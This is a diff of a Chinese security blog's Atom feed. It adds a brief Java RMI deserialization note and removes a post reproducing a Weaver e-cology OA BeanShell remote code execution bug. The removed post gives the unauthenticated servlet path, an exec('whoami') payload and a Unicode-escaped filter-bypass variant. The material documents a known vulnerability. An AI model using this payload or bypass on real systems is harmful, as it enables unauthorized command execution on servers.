@@ -2,14 +2,27 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-12-25T10:35:13.128Z</updated>
+    <updated>2019-12-27T02:04:59.782Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
-    <subtitle>不在平静中灭亡~</subtitle>
+    <subtitle>不在平静中灭亡~  </subtitle>
     <logo>http://www.svenbeast.com//images/avatar.png</logo>
     <icon>http://www.svenbeast.com//favicon.ico</icon>
     <rights>All rights reserved 2019, 斯文beast</rights>
+    <entry>
+        <title type="html"><![CDATA[java RMI反序列化无含量记录]]></title>
+        <id>http://www.svenbeast.com//post/TWAepnjZi</id>
+        <link href="http://www.svenbeast.com//post/TWAepnjZi">
+        </link>
+        <updated>2019-12-27T01:40:10.000Z</updated>
+        <content type="html"><![CDATA[<ul>
+<li>识别端口类型为java RMI时，尝试利用此漏洞</li>
+<li>参考链接：https://www.freebuf.com/vuls/126499.html</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1577412256632.gif" alt=""></figure>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[windwos提权-CVE-2019-1388]]></title>
         <id>http://www.svenbeast.com//post/OsMblUp6w</id>
@@ -702,26 +715,6 @@ Accept-Encoding: gzip,deflate
 Accept-Language: zh-CN,zh;q=0.9
 </code></pre>
 <figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1569316868542.png" alt=""></figure>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[泛微e-cology OA Beanshell组件远程代码执行(复现及POC)]]></title>
-        <id>http://www.svenbeast.com//post/9rcdl83tA</id>
-        <link href="http://www.svenbeast.com//post/9rcdl83tA">
-        </link>
-        <updated>2019-09-23T03:59:58.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="0x01-访问未授权访问页面">0x01 访问未授权访问页面</h3>
-<p>http://oa.xxxx.com/weaver/bsh.servlet.BshServlet<br>
-<img src="http://www.svenbeast.com//post-images/1569211550430.jpg" alt=""></p>
-<h3 id="0x02-输入payload">0x02 输入payload</h3>
-<p>exec(&quot;whoami&quot;);<br>
-输入命令执行函数，传入cmd命令，查看回显是否成功执行<br>
-<img src="http://www.svenbeast.com//post-images/1569211623826.png" alt=""></p>
-<h3 id="0x03-将exec进行unicode编码绕过部分站点exec过滤">0x03 将exec进行Unicode编码绕过部分站点exec过滤</h3>
-<p>\u0065\u0078\u0065\u0063(&quot;whoami&quot;);<br>
-<img src="http://www.svenbeast.com//post-images/1569211999619.png" alt=""></p>
-<p>PS：https://github.com/jas502n/e-cology<br>
-少宇师傅的POC地址，后期批量有时间就写，现在70周年国庆节，有点忙。</p>
 ]]></content>
     </entry>
 </feed>
